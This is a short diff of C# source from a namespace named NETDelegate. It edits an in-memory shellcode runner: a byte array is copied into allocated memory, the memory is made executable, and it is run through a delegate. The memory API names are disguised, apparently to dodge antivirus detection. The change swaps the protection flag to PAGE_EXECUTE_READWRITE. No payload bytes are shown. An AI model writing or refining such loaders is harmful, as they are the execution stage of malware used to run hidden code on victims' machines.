@@ -46,7 +46,7 @@ namespace NETDelegate
             IntPtr addr = FuckAlloc(0, mybytearr.Length, 0x1000, 0x04);
             Marshal.Copy(mybytearr, 0, addr, mybytearr.Length);
             uint word;
-            MYVIRTULProtect(addr, (UIntPtr)mybytearr.Length, (uint)AllocationProtect.PAGE_EXECUTE, out word);
+            MYVIRTULProtect(addr, (UIntPtr)mybytearr.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE,out word);
             EXEC mydel = (EXEC)Marshal.GetDelegateForFunctionPointer(addr, typeof(EXEC));
             mydel();
 
